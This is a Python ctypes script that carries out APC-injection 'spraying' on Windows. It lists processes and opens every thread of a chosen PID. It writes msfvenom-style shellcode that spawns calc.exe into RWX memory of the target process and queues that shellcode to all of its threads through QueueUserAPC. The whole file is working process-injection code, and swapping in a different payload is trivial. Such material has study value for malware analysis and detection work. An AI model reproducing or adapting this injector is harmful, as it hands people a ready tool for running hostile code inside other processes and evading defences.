"""
(prod) APC Injection into a thread - Spraying
- arch: x64 process on x64 systems / 64-bit / PE32+
- target: (any process)
- payload: shellcode -> calc.exe


Note:
-----
- this technique injects an APC object into a thread's APC queue
- object points to shellcode, executes if/when thread enters an alertable wait state

For this reason, this technique is not guaranteed to work, depending on the number/state of threads for a given process, eg:
- notepad.exe,   ~1x thread     - low chance of success
- explorer.exe, ~200 threads    - high chance of succcess

Therefore, here we spray every thread for a given process
- be careful which process you choose to spray

Process/Thread computation done via CreateToolhelp32Snapshot()
- 'snapshot' taken, listing running processes/threads on host
- subsequent enumeration via Process32FirstW() -> Process32NextW(), or Thread32First() -> Thread32Next()


Steps:
------
- Provide list of ProcessIds for given ProcessName
- Return Threads associated with ProcessId
- Allocate Memory       -> VirtualAllocEx()
- Write payload         -> WriteProcessMemory()
- Execute payload spray -> QueueUserAPC()

Glossary:
- APC: Asynchronous Procedure Call
"""

import ctypes
from ctypes import wintypes
from collections import defaultdict
from contextlib import contextmanager
import msvcrt


kernel32 = ctypes.WinDLL('kernel32.dll', use_last_error=True)


# ----------------------------------
# Payloads - sample(s)
# ----------------------------------

# msfvenon shellcode to spawn calc.exe - appended with NOPs (\x90) and infinite loop (\xEB\xFE -> jmp $)
# so that injected process (eg notepad) doesn't die and exit (viewable in ProcExp, TaskManager etc)

buf =  b"\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d"
buf += b"\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01"
buf += b"\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01"
buf += b"\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31"
buf += b"\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45"
buf += b"\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b"
buf += b"\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31"
buf += b"\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2"
buf += b"\x48\xff\xc2\x48\x83\xec\x28\xff\xd0"

payload = buf +  b"\x90\x90\x90\xEB\xFE"




# ----------------------------------
# CONSTANTS
# ----------------------------------

# CreateToolhelp32Snapshot()
INVALID_HANDLE_VALUE        = wintypes.HANDLE(-1)
TH32CS_SNAPPROCESS          = 0x02
TH32CS_SNAPTHREAD           = 0x04

# OpenProcess()
PROCESS_ALL_ACCESS = 0x1F0FFF               # likely to fail unless run elevated/as-admin
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000  # alternative, minimal privileges required

# OpenThread()
THREAD_ALL_ACCESS           = 0x1FFFFF
THREAD_QUERY_INFORMATION    = 0x0040

# PROCESSENTRY32W() struct
MAX_PATH = 260

# VirtualAllocEx() / VirtualProtectEx () - samples
MEM_COMMIT              = 0x1000
MEM_RESERVE             = 0x2000
PAGE_NOACCESS           = 0x01
PAGE_READONLY           = 0x02
PAGE_READWRITE          = 0x04
PAGE_WRITECOPY          = 0x08
PAGE_EXECUTE            = 0x10
PAGE_EXECUTE_READ       = 0x20
PAGE_EXECUTE_READWRITE  = 0x40
PAGE_EXECUTE_WRITECOPY  = 0x80

# ----------------------------------
# Struct Definitions
# ----------------------------------

class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize",              wintypes.DWORD),
        ("cntUsage",            wintypes.DWORD),
        ("th32ProcessID",       wintypes.DWORD),
        ("th32DefaultHeapID",   ctypes.c_size_t),
        ("th32ModuleID",        wintypes.DWORD),
        ("cntThreads",          wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase",      wintypes.LONG),
        ("dwFlags",             wintypes.DWORD),
        ("szExeFile",           wintypes.WCHAR * MAX_PATH)
]

class THREADENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize",              wintypes.DWORD),
        ("cntUsage",            wintypes.DWORD),
        ("th32ThreadID",        wintypes.DWORD),
        ("th32OwnerProcessID",  wintypes.DWORD),
        ("tpBasePri",           wintypes.LONG),
        ("tpDeltaPri",          wintypes.LONG),
        ("dwFlags",             wintypes.DWORD),
    ]



# ----------------------------------
# Function Prototypes
# ----------------------------------

# --------------- kernel32.dll ---------------
kernel32.CloseHandle.argtypes = [ wintypes.HANDLE, ]  # hObject
kernel32.CloseHandle.restype = wintypes.BOOL

kernel32.CreateToolhelp32Snapshot.argtypes=[
    wintypes.DWORD,     # dwFlags
    wintypes.DWORD,     # th32ProcessID
]
kernel32.CreateToolhelp32Snapshot.restype = wintypes.HANDLE

kernel32.GetThreadId.argtypes = [ wintypes.HANDLE, ]
kernel32.GetThreadId.restype = wintypes.DWORD

kernel32.OpenProcess.argtypes = [
    wintypes.DWORD,    # dwDesiredAccess
    wintypes.BOOL,     # bInheritHandle
    wintypes.DWORD,    # dwProcessId
]
kernel32.OpenProcess.restype = wintypes.HANDLE

kernel32.OpenThread.argtypes = [
    wintypes.DWORD,    # dwDesiredAccess
    wintypes.BOOL,     # bInheritHandle
    wintypes.DWORD,    # dwThreadId
]
kernel32.OpenThread.restype = wintypes.HANDLE

kernel32.Process32FirstW.argtypes = [
    wintypes.HANDLE,                    # hSnapshot
    ctypes.POINTER(PROCESSENTRY32W),    # [o] lppe, proc-list entry from snapshot
]
kernel32.Process32FirstW.restype = wintypes.BOOL

kernel32.Process32NextW.argtypes=[
    wintypes.HANDLE,                    # hSnapshot
    ctypes.POINTER(PROCESSENTRY32W),    # [o] lppe, proc-list entry from snapshot
]
kernel32.Process32NextW.restype = wintypes.BOOL

kernel32.QueueUserAPC.argtypes = [
    ctypes.c_void_p,        # pfnAPC, pointer to APC func called when thread performs alertable operation
    wintypes.HANDLE,        # hThread
    ctypes.c_void_p,        # dwData (ULONG_PTR -> void* works)
]
kernel32.QueueUserAPC.restype = wintypes.DWORD

kernel32.Thread32First.argtypes = [
    wintypes.HANDLE,                    # hSnapshot
    ctypes.POINTER(THREADENTRY32),      # lpte
]
kernel32.Thread32First.restype = wintypes.BOOL

kernel32.Thread32Next.argtypes = [
    wintypes.HANDLE,                    # hSnapshot
    ctypes.POINTER(THREADENTRY32),      # lpte
]
kernel32.Thread32Next.restype = wintypes.BOOL

kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE,        # hProcess
    wintypes.LPVOID,        # lpAddress (opt) (can be null)
    ctypes.c_size_t,        # dwSize
    wintypes.DWORD,         # flAllocationType
    wintypes.DWORD,         # flProtect
]
kernel32.VirtualAllocEx.restype = ctypes.c_void_p

kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpBaseAddress
    wintypes.LPCVOID,                   # lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] *lpNumberOfBytesWritten
]
kernel32.WriteProcessMemory.restype = wintypes.BOOL


# ----------------------------------
# Function Definitions
# ----------------------------------


# --------------- Misc helper functions ---------------
def winerr() -> OSError:
    """ Return a ctypes.WinError() with the last Windows API error """
    return ctypes.WinError(ctypes.get_last_error())

def close_handle(handle: wintypes.HANDLE, name: str="Handle") -> None:
    """ Close open handles, to prevent resource leaks """

    print(f"    -> Closing Handle to {name}: ", end='')
    if handle is None or handle.value == 0:
        raise ValueError(f"[!] Warning: {name} is None or invalid, nothing to close")

    if not kernel32.CloseHandle(handle):
        print(f"[!] Failed! {name} handle: {handle}, Error: {winerr()}")
    else:
        print(f"Success ({handle.value})")

def key_sort(name: str) -> str:
    """ Ensure processes sorted alphabetically, regardless of case """
    return name.casefold()

def pause() -> None:
    """ Pause until user key press (any) """
    msg = "\nPress any key to continue (list PIDs by process) ..."
    print(msg, end='', flush=True)
    msvcrt.getch()
    print()

def print_hdr(hdr: str) -> None:
    border = "-" * len(hdr.strip())
    print(f"\n{border}{hdr}{border}")


# --------------- Process Id information ---------------

def group_pids_by_process() -> tuple[
            defaultdict[str, list[int]],
            dict[int, str]
]:
    """
    Snapshot taken of running processes -> TH32CS_SNAPPROCESS
    - iterated by Process32FirstW -> Process32NextW, until empty

    Returns a numer of dictionaries later used for different purposes
    [+] proc_groups: 
    - defaultdict() of process names, and list of associated PIDs
    - for iteration of full-print out 

    [+] pid_to_proc_map: O(1)
    - PID validation, 1:1 of PID to process name
    """

    # proc_groups -> for iterating whole list in full print-out
    proc_groups: defaultdict[str, list[int]] = defaultdict(list)

    # pid_proc_map -> fast search for later-on PID validation
    pid_to_proc_map: dict[int, str] = {}

    pe32w = PROCESSENTRY32W()
    pe32w.dwSize = ctypes.sizeof(PROCESSENTRY32W)

    # Context Manager - snapshot
    with snapshot(TH32CS_SNAPPROCESS) as hSnapshot: 
        if not kernel32.Process32FirstW(hSnapshot, ctypes.byref(pe32w)):
            raise winerr()

        print("    -> Taking Snapshot: Running Processes... ", end='', flush=True)

        while True:
            name = pe32w.szExeFile      # process name
            pid  = pe32w.th32ProcessID  # leave PIDs as ints in list

            proc_groups[name].append(pid)
            pid_to_proc_map[pid] = name
                
            if not kernel32.Process32NextW(hSnapshot, ctypes.byref(pe32w)):
                break

        print("Completed")

    return proc_groups, pid_to_proc_map




def print_pids_by_process(process_groups: dict[str, list[int]]) -> None:
    """
    Print Process Names -> associated PIDs -> count of PIDs
    - sorted alphabetically, then numerically
    - PID list truncated if too long (eg svchost.exe)
    """

    # header info
    print(f"\n{'Process Name':<40} {'PID':<40} {'Count':>5}")
    print('-' * 87)


    for process_name in sorted(process_groups.keys(), key=key_sort):
        sorted_pids = sorted(process_groups[process_name])
        
        # join pids -> must first be converted to type str()
        pid_list_str = ', '.join(str(pid) for pid in sorted_pids)
        
        count = len(sorted_pids)
        
        # truncate long list of PIDs
        if len(pid_list_str) > 35:
            pid_list_str = pid_list_str[:35] + '...'
        
        print(f"{process_name:<40} {pid_list_str:<40} {count:<5}")




def request_pid(pid_map: dict[int, str]) -> int:
    """ Return positive integer -> later validate if actual PID """
    while True:
        try:
            pid = int(input("\nPlease enter a valid PID: "))
            if pid > 0:
                if validate_pid(pid, pid_map):
                    return pid
            else:
                print("[!] Please enter a positive integer: ")
        except ValueError as e:
            print(f"\n[!] Invalid Input, Error: {e}")




def validate_pid(pid: int, pid_map: dict[int, str]) -> bool:
    """ Checks if PID exists in previous 'fast-search' dict map """
    
    process_name = pid_map.get(pid)

    if process_name:
        print(f"[+] PID found: {pid} Process: {process_name}")
        return True
    else:
        print(f"[!] Error: PID {pid} not found in snapshot")
        return False


# --------------- Thread Information ---------------

def get_all_thread_handles_for_pid(pid: int) -> list[wintypes.HANDLE]:
    """
    Get handles to ALL threads, for a given Pid 
    - for spraying APC to all threads, as targeting thread is unreliable
    """
    
    # get all threads for given process id
    thread_handles = []
    thread_ids = []
    
    te32 = THREADENTRY32()
    te32.dwSize = ctypes.sizeof(THREADENTRY32)

    # iterate through system snapshot of active threads
    with snapshot(TH32CS_SNAPTHREAD) as hSnapshot:    
        if not kernel32.Thread32First(hSnapshot, ctypes.byref(te32)):
            raise winerr()
            
        print("    -> Taking Snapshot: Active Threads... ", end='', flush=True)
        
        while True:
            if te32.th32OwnerProcessID == pid:
                thread_ids.append(te32.th32ThreadID)
            
            if not kernel32.Thread32Next(hSnapshot, ctypes.byref(te32)):
                break
 
        print("Completed")
 
        if not thread_ids: # shouldn't really happen even for CREATE_SUSPENDED..
            return []
        
        # process thread handles
        for tid in thread_ids:
            hThread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, tid)
            
            if not hThread:
                print(f"[!] Failed to open handle to TID: {tid}")
                continue
                
            thread_handles.append(wintypes.HANDLE(hThread))
                
        print(f"    -> ThreadIds: {len(thread_ids)}")
        print(f"    -> hThreads:  {len(thread_handles)}")


    return thread_handles


# --------------- Memory Manipulation ---------------


def virtual_alloc_ex(
    hProcess: wintypes.HANDLE,
    dwSize: ctypes.c_size_t
) -> wintypes.LPVOID:

    """
    Allocate memory space in suspended process
    - returns pointer to allocated memory, in remote process
    
    Requesting allocation address same as img_base_addr
    - if not available, ptr= assignment should fail and error out
    """

    hdr = "\n>>>>    Allocating Memory -> VirtualAllocEx()    <<<<\n"
    print_hdr(hdr)
    
    lpAddress = ctypes.c_void_p(0)
    
    ptr = kernel32.VirtualAllocEx(hProcess,
                            lpAddress,
                            dwSize,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_EXECUTE_READWRITE) # red flag but fine for PoC

    if not ptr:
        raise winerr()
    
    return ptr




def write_payload_shellcode(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: int,
    payload: bytes
) -> None:

    """ Writes raw payload bytes directly into the target process memory """

    print(f"\n[+] Writing payload: WriteProcessMemory()")
    print(f"    -> Destination Address: {hex(lpBaseAddress)}")
    print(f"    -> Payload Size: {len(payload)} bytes")

    n_written = ctypes.c_size_t(0)

    if not kernel32.WriteProcessMemory(
        hProcess,
        lpBaseAddress,     # target/base address
        payload,           # raw byte string (e.g., b"\xfc\x48...")
        len(payload),      # size of payload
        ctypes.byref(n_written)
    ):
        raise winerr()

    print(f"    -> Bytes written: {n_written.value}")


# --------------- Execution ---------------


def add_to_apc_queue(lpBaseAddress: wintypes.c_void_p, hThread: wintypes.HANDLE) -> bool:
    """ Add memory pointer to malicious payload, to APC queue of specified thread """
    
    if not kernel32.QueueUserAPC(lpBaseAddress, hThread, 0):
        print(f"Failed: {ctypes.WinError(ctypes.get_last_error())}")
        return False

    print(f"Success: ({hThread.value})")
    return True




def apc_sray_to_all_threads(list_of_thread_handles: list) -> None:
    """ Spray APC to all hThreads for ProcessId """
    
    print(f"\n[+] Attempting APC Spray...")
    success = 0

    for hThread in list_of_thread_handles:
        if add_to_apc_queue(lpBaseAddress, hThread):
            success += 1
        close_handle(hThread, "Thread")
        
    print(f"\n[+] APC Spray Complete, success rate: {success}/{len(list_of_thread_handles)}")




# ----------------------------------
# Context Managers
# ----------------------------------
#
# To be able to use 'with x as y:'
# - to automatically close handles upon exit

@contextmanager
def open_process(
        dwProcessId, 
        dwDesiredAccess=PROCESS_ALL_ACCESS, 
        bInheritHandle=False):
    print(f"\n[+] Opening Handle to Process: ", end='', flush=True)

    handle = wintypes.HANDLE(kernel32.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId))

    if not handle:
        raise winerr()

    print(f"Success ({handle.value})")

    try:
        yield handle        # give caller, access to handle
    finally:
        close_handle(handle, "Process")
        handle.value = 0




@contextmanager
def snapshot(flags=TH32CS_SNAPPROCESS):
    print("\n[+] Creating handle to Snapshot: ", end='')
    hSnapshot = wintypes.HANDLE(kernel32.CreateToolhelp32Snapshot(flags, 0))

    if hSnapshot == INVALID_HANDLE_VALUE:
        raise winerr()

    print(f"Successful ({hSnapshot.value})")

    try:
        yield hSnapshot     # give caller, access to handle
    finally:
        close_handle(hSnapshot, "Snapshot")
        hSnapshot.value = 0




##########################################
##### Main functionality starts here #####
##########################################

# ----- Process Id information -----

# <- proc_groups: defaultdict[str, list[int]]
# <- pid_map: dict[int, str]

proc_groups, pid_map = group_pids_by_process()
pause()

# print pids, grouped by process name 
print_pids_by_process(proc_groups)

# ask/validate user entered PID <- int
chosen_pid = request_pid(pid_map)


# ----------------------------------
# Open handle to process
# ----------------------------------

with open_process(chosen_pid) as hProcess:

    # get handle to thread (assuming main thread is first in list)
    list_of_thread_handles = get_all_thread_handles_for_pid(chosen_pid)

    if not list_of_thread_handles:
        print("[!] No thread handles obtained, aborting [!]")
        exit(1)

    
    # allocate memory
    lpBaseAddress = virtual_alloc_ex(hProcess, len(payload))

    # write payload
    write_payload_shellcode(hProcess, lpBaseAddress, payload)

    # execute, spray APC to all thread handles
    apc_sray_to_all_threads(list_of_thread_handles)
